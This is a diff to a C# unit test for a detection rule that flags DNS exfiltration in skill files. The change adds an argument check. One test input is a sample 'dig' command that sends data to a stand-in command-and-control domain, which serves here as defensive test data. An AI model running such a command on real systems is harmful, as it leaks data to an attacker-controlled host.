@@ -32,6 +32,7 @@ public class DnsExfiltrationRuleTests : IEquatable<DnsExfiltrationRuleTests>
     [InlineData("dig +short txt data$COUNTER.c2.example")]
     public void Fires_OnDnsChannels(string line)
     {
+        ArgumentException.ThrowIfNullOrEmpty(line);
         var findings = _rule.Scan(Targets.Skill(line)).ToList();
         Assert.NotEmpty(findings);
         Assert.All(findings, f => Assert.Equal("SG007", f.RuleId));
